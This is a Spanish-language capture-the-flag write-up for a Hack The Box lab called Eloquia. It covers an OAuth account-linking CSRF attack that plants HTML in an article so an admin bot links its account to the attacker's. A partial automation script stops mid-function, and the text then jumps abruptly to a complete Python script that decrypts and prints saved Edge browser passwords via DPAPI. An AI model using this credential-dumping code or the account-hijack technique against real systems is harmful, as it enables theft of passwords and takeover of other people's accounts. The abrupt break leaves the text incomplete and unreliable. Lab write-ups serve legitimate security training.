## Análisis de servicios web y omisión de OAuth

Aquí no hay ningún CMS como WordPress, solo una aplicación personalizada de Django. Según mi experiencia con OSCP y pruebas de penetración, las mayores fallas suelen residir en este tipo de aplicaciones web personalizadas.

Sin embargo, tras investigar con Burp Proxy , solo encontré inyección de HTML en la creación de artículos. No se representan todas las etiquetas de la inyección; por ejemplo, imgalgunas se filtraron. Dejaremos este hallazgo por ahora.

Generalmente, si no encuentro nada interesante como inyección de comandos y RFI/LFI, paso a analizar el mecanismo de autorización e inicio de sesión.

![alt text](/assets/img/eloquia3.png)

Además del inicio de sesión estándar con credenciales, también existe la opción de autenticación mediante OAuth. La opción de Facebook no está implementada en el laboratorio, pero Qooqle intenta redirigirnos al dominio qooqle.htb.

¿Y si existe un servicio funcionando en ese dominio? Podemos añadirlo al archivo /etc/hosts y luego acceder a `http://qooqle.htb.`

En eloquia.htb es posible crear dos cuentas diferentes y posteriormente conectarlas desde: `http://eloquia.htb/accounts/connect/`

Veamos ahora todos los pasos necesarios para autorizar la conexión de cuentas.

![alt text](/assets/img/eloquia4.png)

1. La solicitud de autorización nos redirige a qooqle.htb.

2. Qooqle asigna un identificador único a la solicitud, define el tipo de respuesta como code y establece una URL de redirección (redirect URI).

3. Al enviar la solicitud a Qooqle, la respuesta del servidor incluye un encabezado Location con la URL de redirección y el code: `Location: http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=kKIRcYIEj7slquQOTgnYogRujqQDFx`

4. Tras la redirección, este código es enviado a Eloquia. En el backend, siguiendo el estándar OAuth 2.0, Eloquia utiliza dicho código para comunicarse con la API del servidor de autorización de Qooqle e intercambiarlo por un token de acceso. Como resultado, la sesión del usuario en Eloquia queda vinculada a los datos proporcionados por Qooqle, asociando así la cuenta local con la cuenta de Qooqle.

¿Qué pasa si asociamos la cuenta de Eloquia de otra persona con nuestra cuenta de Qooqle? Para ello, necesitamos secuestrar la sesión de la víctima para atacar el tercer paso. ¿Pero cómo lo hacemos?

Diré de entrada que a los creadores de HTB no les gusta mucho el XSS, pero lo busqué y no lo encontré. Así que, sigamos buscando CSRF. Y aquí va otra pista: a HTB le gusta crear bots de administración a los que intentan engañar para que realicen acciones inseguras.

Así que, de inmediato, se ideó un plan, basándose en que no se verifica el código fuente de respuesta en el paso cuatro. Por lo tanto, Eloquia puede usar cualquier código con cualquier sesión de usuario. ¡Y entonces recordamos la inyección HTML que encontramos antes!

Creemos un artículo (`http://eloquia.htb/article/create/`) e insertemos código HTML que redirija al administrador al sitio autorizado y vincule nuestra cuenta de Qooqle con su cuenta de Eloquia. Luego, simplemente inicie sesión en Eloquia mediante OAuth con Qooqle y obtenga derechos de administrador.

Ahora bien, ¿cómo podemos garantizar que será el administrador quien abra primero el artículo malicioso y sea detectado?

Tenga en cuenta que hay un botón de Informe (`http://eloquia.htb/article/visit/<Article ID>/`), y sería lógico que el administrador revisara todos los informes. Ahí es donde lo atraparemos.

Es bastante problemático hacer todo esto sin automatización, así que creé un pequeño script en python:

def get_csrf(body):
    match = re.search(r'(?<=value=")\w{64}(?=">)', body)
    if match:
        return match.group(0)
    raise ValueError("[-] CSRF token not found!")

def poison_article():

    r = requests.get(ARTICLE_URL, cookies=COOKIES, proxies=PROXIES)
    title = "NICE ARTICLE"

    #get article ID for later
    loc_header = r.headers["Location"]

## Toma de control de otra cuenta

Tras buscar en Google, descubrimos que todos los secretos de Edge se almacenan en un archivo `Login Data` y se cifran con una clave ubicada en `Local State`. Sin embargo, esta clave también se vuelve a cifrar con la clave maestra de DPAPI. Dado que estamos en una sesión de usuario web, podemos intentar descifrarla con la clave de sesión

```python
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_master_key(local_state_path):
    with open(local_state_path, "r") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode() 
        return decrypted_pass
    except:
        return "Failed to decrypt"

def main():
    local_state_path = "c:\\Users\\web\\local_state.json" # buscar ruta
    login_db_path = "c:\\Users\\web\\login_data.json" # buscar ruta
    master_key = get_master_key(local_state_path)
    
    shutil.copy2(login_db_path, "temp_login.db")
    conn = sqlite3.connect("temp_login.db")
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n")
    except Exception as e:
        print(f"Error: {e}")
    
    cursor.close()
    conn.close()
    os.remove("temp_login.db")

if __name__ == "__main__":
    main()
```
